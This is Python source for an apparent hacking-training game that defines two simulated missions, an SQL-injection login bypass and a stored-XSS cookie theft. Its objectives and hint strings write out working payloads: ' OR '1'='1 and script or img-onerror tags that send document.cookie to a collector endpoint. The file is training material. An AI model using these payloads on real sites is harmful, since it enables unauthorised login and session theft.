"""Web security missions: SQL injection + XSS cookie theft."""

from .base import Mission, MissionResult, CommandSpec, HintTier


# ======================================================================
# Mission 5 - SQL Injection (Medium)
# ======================================================================
class _SqliMission(Mission):
    id = "m_web_sqli"
    title = "Login Bypass"
    category = "Web Security"
    difficulty = "Medium"
    max_score = 150
    unlocks_codex = ["sql_injection", "prepared_statement"]
    unlocks_mission = "m_web_xss"

    briefing = (
        "INCOMING TRANSMISSION - source: guild handler\n"
        "\n"
        "  A target is running an internal admin panel at\n"
        "  http://10.0.0.7/admin. The login form is rumored to be\n"
        "  vulnerable to SQL injection - the developer concatenated\n"
        "  user input straight into the query.\n"
        "\n"
        "  The login form posts two fields: 'user' and 'pass'. The query\n"
        "  on the server is:\n"
        "\n"
        "    SELECT * FROM users WHERE name = '<user>' AND pass = '<pass>'\n"
        "\n"
        "  Your goal: bypass authentication WITHOUT valid credentials.\n"
        "  Once you're in, the admin panel prints the flag.\n"
        "\n"
        "  Tools:\n"
        "    login <user> <pass>     simulate posting the login form\n"
        "    query <sql>             run raw SQL against the simulated DB\n"
    )

    objective = (
        "1. Try a normal login first: login admin password\n"
        "2. Think about how to make WHERE always true. Classic payload: ' OR '1'='1\n"
        "3. Inject it: login \"' OR '1'='1\" anything\n"
        "4. Submit the flag the panel reveals."
    )

    def setup(self):
        self.flag = "flag{prepared_statements_save_lives}"

        self.fs = {
            "README.txt": (
                "Target login form fields: 'user' and 'pass'.\n"
                "Backend query: SELECT * FROM users WHERE name = '<user>' AND pass = '<pass>'\n"
                "If the query returns >=1 row, login succeeds.\n"
                "Try the 'login' command, then 'query' to experiment directly.\n"
            ),
            "source.txt": (
                "// Vulnerable PHP (redacted)\n"
                "$user = $_POST['user'];\n"
                "$pass = $_POST['pass'];\n"
                "$sql = \"SELECT * FROM users WHERE name = '$user' AND pass = '$pass'\";\n"
                "$result = mysqli_query($conn, $sql);\n"
                "if (mysqli_num_rows($result) > 0) {\n"
                "    // login OK - show admin panel\n"
                "} else {\n"
                "    echo 'Invalid credentials';\n"
                "}\n"
            ),
        }

        # Simulated users table
        self._users = [
            {"id": 1, "name": "alice",  "pass": "alice123"},
            {"id": 2, "name": "bob",    "pass": "bobpass"},
            {"id": 3, "name": "carol",  "pass": "carolpw"},
        ]

        def _login_handler(args, mission):
            if len(args) < 2:
                return MissionResult(
                    output="usage: login <user> <pass>",
                    error=True, sound="error",
                )
            user = args[0]
            # Allow multi-word password - take rest as-is
            passw = " ".join(args[1:])
            # Strip surrounding quotes that the shell-style tokenizer leaves
            passw = passw.strip().strip('"').strip("'")
            # Build the simulated query
            sql = f"SELECT * FROM users WHERE name = '{user}' AND pass = '{passw}'"
            lines = [
                f"[*] POST /admin user={user!r} pass={passw!r}",
                f"[*] server-side SQL: {sql}",
            ]
            # Very small SQL-ish evaluation: check if the WHERE evaluates truthy
            # for at least one row. We support: literal comparisons, OR, AND, '1'='1'
            try:
                matched = mission._eval_where(user, passw)
            except Exception as e:
                lines.append(f"[-] SQL error: {e}")
                return MissionResult(output="\n".join(lines), error=True, sound="error")

            if matched:
                lines.append("[+] 200 OK - admin panel accessed!")
                lines.append("")
                lines.append("---- ADMIN PANEL ----")
                lines.append("Welcome, administrator.")
                lines.append(f"Flag: {mission.flag}")
                lines.append("---------------------")
                return MissionResult(output="\n".join(lines), sound="ok")
            else:
                lines.append("[-] 401 Unauthorized - Invalid credentials")
                return MissionResult(output="\n".join(lines), error=True, sound="error")

        def _query_handler(args, mission):
            if not args:
                return MissionResult(
                    output="usage: query <sql>",
                    error=True, sound="error",
                )
            sql = " ".join(args).strip().strip('"').strip("'")
            # We only answer SELECT * FROM users WHERE ... style queries
            lines = [f"[*] running: {sql}"]
            try:
                matched = mission._eval_raw_sql(sql)
            except Exception as e:
                lines.append(f"[-] SQL error: {e}")
                return MissionResult(output="\n".join(lines), error=True, sound="error")
            if matched:
                lines.append(f"[+] {len(matched)} row(s) returned")
                for row in matched:
                    lines.append(f"    {row}")
            else:
                lines.append("[+] 0 rows returned")
            return MissionResult(output="\n".join(lines), sound="click")

        self.commands = {
            "login": CommandSpec(
                name="login",
                usage="login <user> <pass>",
                description="Submit the admin login form with given user/pass.",
                handler=_login_handler,
            ),
            "query": CommandSpec(
                name="query",
                usage="query <sql>",
                description="Run raw SQL against the simulated DB (for experimentation).",
                handler=_query_handler,
            ),
        }

        self.hints = [
            HintTier(
                text="If you control the string between quotes in the SQL, you can break out of the string literal "
                     "and inject SQL syntax. The payload ' OR '1'='1 closes the string, adds an always-true condition, "
                     "and the trailing quote from the server completes the last string.",
                cost=15,
            ),
            HintTier(
                text="Use 'login' with a payload that makes WHERE always true. The 'user' field is the easiest target:\n"
                     "  login \"' OR '1'='1\" x",
                cost=20,
            ),
            HintTier(
                text=f"Exact command:\n"
                     f"  login \"' OR '1'='1\" anything\n"
                     f"The server runs: SELECT * FROM users WHERE name = '' OR '1'='1' AND pass = 'anything'\n"
                     f"'1'='1' is true for every row, so login succeeds.",
                cost=30,
            ),
        ]

    # ------------------------------------------------------------------
    def _eval_where(self, user_val: str, pass_val: str) -> bool:
        """Evaluate the vulnerable query's WHERE against the simulated users."""
        # Build the WHERE clause as the server would
        # WHERE name = '<user>' AND pass = '<pass>'
        # We need to evaluate the resulting expression after substitution.
        where = f"name = '{user_val}' AND pass = '{pass_val}'"
        return self._eval_sql_where(where, self._users)

    def _eval_raw_sql(self, sql: str) -> list[dict]:
        """Very minimal SQL evaluator supporting SELECT * FROM users WHERE <expr>."""
        sql_norm = sql.strip().rstrip(";")
        if not sql_norm.upper().startswith("SELECT"):
            raise ValueError("only SELECT supported")
        # Extract WHERE clause
        upper = sql_norm.upper()
        where_idx = upper.find("WHERE")
        if where_idx < 0:
            return list(self._users)
        where_clause = sql_norm[where_idx + 5:].strip()
        return [row for row in self._users if self._eval_sql_where(where_clause, [row])]

    def _eval_sql_where(self, where: str, rows: list[dict]) -> bool:
        """Evaluate a single-row WHERE clause returning True/False.

        Supports: col = 'literal', AND, OR, parentheses. Just enough to
        demonstrate SQL injection semantics.
        """
        # Tokenize: split on AND/OR but keep them
        # Very simple approach: replace 'col' with the row's value, then eval.
        # WARNING: this is a teaching simulator, NOT a real SQL engine.
        import re

        def substitute(expr: str, row: dict) -> str:
            # Replace column references with their values
            for col in ("name", "pass", "id"):
                # match column name as a word, not inside a quoted string
                # Simple regex: word boundary + col + word boundary
                pattern = re.compile(rf"\b{col}\b")
                val = row.get(col)
                if isinstance(val, str):
                    repl = repr(val)
                else:
                    repl = str(val)
                expr = pattern.sub(repl, expr)
            return expr

        # We just need to know if ANY row evaluates to True
        for row in rows:
            expr = substitute(where, row)
            # Now expr looks like: "'alice' = 'alice' AND 'x' = 'y'"
            # Replace = with == so Python can eval, but only the comparison ones
            # (not the ones inside string literals - but since we used repr, = inside strings is fine)
            # Actually 'a' = 'b' isn't valid Python. Use ==.
            # We need to be careful: only replace = that is NOT inside a string literal.
            py_expr = self._replace_eq_outside_strings(expr)
            try:
                if eval(py_expr, {"__builtins__": {}}, {}):
                    return True
            except Exception:
                continue
        return False

    @staticmethod
    def _replace_eq_outside_strings(s: str) -> str:
        """Replace ' = ' with ' == ' when not inside a quoted string."""
        out = []
        i = 0
        in_str = False
        quote = ""
        while i < len(s):
            ch = s[i]
            if in_str:
                out.append(ch)
                if ch == quote:
                    in_str = False
                i += 1
                continue
            if ch in ("'", '"'):
                in_str = True
                quote = ch
                out.append(ch)
                i += 1
                continue
            # Look ahead for ' = ' (single equals, surrounded by spaces or by quote/space)
            if ch == "=" and (i + 1 >= len(s) or s[i + 1] != "="):
                # only convert if previous non-space char isn't '=' already
                # and this is a single '='
                out.append("==")
                i += 1
                continue
            out.append(ch)
            i += 1
        return "".join(out)


MISSION_WEB_SQLI = _SqliMission()


# ======================================================================
# Mission 6 - XSS Cookie Theft (Hard)
# ======================================================================
class _XssMission(Mission):
    id = "m_web_xss"
    title = "Cookie Theft"
    category = "Web Security"
    difficulty = "Hard"
    max_score = 180
    unlocks_codex = ["xss", "cookie", "csrf"]
    unlocks_mission = "m_re_binary"

    briefing = (
        "INCOMING TRANSMISSION - source: guild handler\n"
        "\n"
        "  The target runs a comment board at http://10.0.0.9/board.\n"
        "  Users can post comments which are then displayed to everyone\n"
        "  who visits - including the admin. The comment field is NOT\n"
        "  sanitized: anything you post runs as HTML in the viewer's\n"
        "  browser.\n"
        "\n"
        "  Your objective: post a stored XSS payload that exfiltrates the\n"
        "  admin's session cookie to your collector endpoint. Then use\n"
        "  that cookie to impersonate the admin and read the flag.\n"
        "\n"
        "  Tools:\n"
        "    post <comment>          post a comment to the board\n"
        "    view                    view the board as the admin\n"
        "    collector               dump cookies your collector received\n"
        "    usecookie <cookie>      try to use a cookie for admin access\n"
    )

    objective = (
        "1. Inspect the board: view\n"
        "2. Post an XSS payload that includes document.cookie and points\n"
        "   to your collector. The collector URL is /collect?c=\n"
        "3. View the board again (the admin will 'visit' your comment).\n"
        "4. Run 'collector' to see the captured cookie.\n"
        "5. Use the cookie: usecookie <session_id>\n"
        "6. Submit the flag the admin panel reveals."
    )

    def setup(self):
        self.flag = "flag{httponly_saves_cookies}"

        self.fs = {
            "README.txt": (
                "Comment field accepts raw HTML.\n"
                "Admin's browser will execute any <script> tags in your comment.\n"
                "Your collector endpoint is at /collect?c=<data>\n"
                "If you can craft an <img> or <script> tag that fetches\n"
                "/collect?c=document.cookie, the admin's cookie leaks to you.\n"
            ),
            "source.txt": (
                "// comment.js (server-side render, vulnerable)\n"
                "function renderComment(text) {\n"
                "    // BAD: directly injects user text as HTML\n"
                "    return '<div class=\"comment\">' + text + '</div>';\n"
                "}\n"
            ),
        }

        # Simulated admin cookie
        self._admin_cookie = "PHPSESSID=a1b2c3d4e5f6_admin_session"
        self._collected_cookies: list[str] = []
        self._comments: list[str] = []

        def _post_handler(args, mission):
            if not args:
                return MissionResult(
                    output="usage: post <comment>",
                    error=True, sound="error",
                )
            comment = " ".join(args).strip()
            # Strip surrounding quotes if user wrapped the whole thing
            if (comment.startswith('"') and comment.endswith('"')) or \
               (comment.startswith("'") and comment.endswith("'")):
                comment = comment[1:-1]
            mission._comments.append(comment)
            return MissionResult(
                output=(
                    f"[*] POST /board/comment\n"
                    f"[*] comment stored.\n"
                    f"[*] the admin will see it the next time they 'view' the board.\n"
                ),
                sound="ok",
            )

        def _view_handler(args, mission):
            lines = [
                "[*] GET /board",
                "[+] 200 OK",
                "",
                "---- /board ----",
            ]
            if not mission._comments:
                lines.append("(no comments yet)")
            for c in mission._comments:
                lines.append(f"<div class=\"comment\">{c}</div>")
            lines.append("----------------")
            # Simulate the admin's browser executing scripts in comments.
            # We detect <script> or <img ... onerror=...> or fetch(/collect?c=...) patterns.
            exfil = False
            for c in mission._comments:
                lc = c.lower()
                if "document.cookie" in lc and ("/collect?" in lc or "collect?c=" in lc):
                    exfil = True
                # Common payload patterns
                if "<script" in lc and "document.cookie" in lc:
                    exfil = True
                if "<img" in lc and "onerror" in lc and "cookie" in lc:
                    exfil = True
            if exfil:
                mission._collected_cookies.append(mission._admin_cookie)
                lines.append("")
                lines.append("[*] (admin visited the board)")
                lines.append("[*] (admin's browser executed your payload)")
                lines.append(f"[*] collector received: {mission._admin_cookie}")
            else:
                lines.append("")
                lines.append("[*] (admin visited the board, but no cookie exfiltrated)")
            return MissionResult(output="\n".join(lines), sound="click")

        def _collector_handler(args, mission):
            if not mission._collected_cookies:
                return MissionResult(
                    output=(
                        "[*] collector endpoint: /collect\n"
                        "(no cookies captured yet - post an XSS payload and 'view' the board)"
                    ),
                    sound="click",
                )
            lines = ["[*] collector endpoint: /collect", ""]
            for i, c in enumerate(mission._collected_cookies, 1):
                lines.append(f"  #{i}: {c}")
            lines.append("")
            lines.append("Use 'usecookie <value>' to impersonate the session.")
            return MissionResult(output="\n".join(lines), sound="click")

        def _usecookie_handler(args, mission):
            if not args:
                return MissionResult(
                    output="usage: usecookie <cookie_value>",
                    error=True, sound="error",
                )
            cookie = " ".join(args).strip()
            # Match if the cookie contains the admin's PHPSESSID value
            sessid = mission._admin_cookie.split("=", 1)[1]
            if sessid in cookie or cookie == mission._admin_cookie:
                return MissionResult(
                    output=(
                        f"[*] GET /admin  Cookie: {cookie}\n"
                        f"[+] 200 OK - admin session validated\n"
                        "\n"
                        "---- ADMIN PANEL ----\n"
                        "Welcome back, admin.\n"
                        f"Flag: {mission.flag}\n"
                        "---------------------\n"
                    ),
                    sound="ok",
                )
            return MissionResult(
                output=(
                    f"[*] GET /admin  Cookie: {cookie}\n"
                    f"[-] 403 Forbidden - session invalid"
                ),
                error=True, sound="error",
            )

        self.commands = {
            "post": CommandSpec(
                name="post",
                usage="post <comment>",
                description="Post a comment to the board. Raw HTML is allowed.",
                handler=_post_handler,
            ),
            "view": CommandSpec(
                name="view",
                usage="view",
                description="View the board as the admin (triggers XSS payloads).",
                handler=_view_handler,
            ),
            "collector": CommandSpec(
                name="collector",
                usage="collector",
                description="Dump cookies captured by your exfiltration endpoint.",
                handler=_collector_handler,
            ),
            "usecookie": CommandSpec(
                name="usecookie",
                usage="usecookie <cookie_value>",
                description="Try to use a stolen cookie to access the admin panel.",
                handler=_usecookie_handler,
            ),
        }

        self.hints = [
            HintTier(
                text="You need an HTML tag that runs JavaScript when the admin's browser renders your comment. "
                     "The classic payloads are: <script>fetch('/collect?c='+document.cookie)</script> or "
                     "<img src=x onerror=\"fetch('/collect?c='+document.cookie)\">.",
                cost=20,
            ),
            HintTier(
                text="Exact payload to post:\n"
                     "  post \"<script>fetch('/collect?c='+document.cookie)</script>\"\n"
                     "Then run 'view' to make the admin visit the board.",
                cost=30,
            ),
            HintTier(
                text=f"After 'view', run 'collector' to see the captured cookie. Then:\n"
                     f"  usecookie {self._admin_cookie}",
                cost=40,
            ),
        ]


MISSION_WEB_XSS = _XssMission()
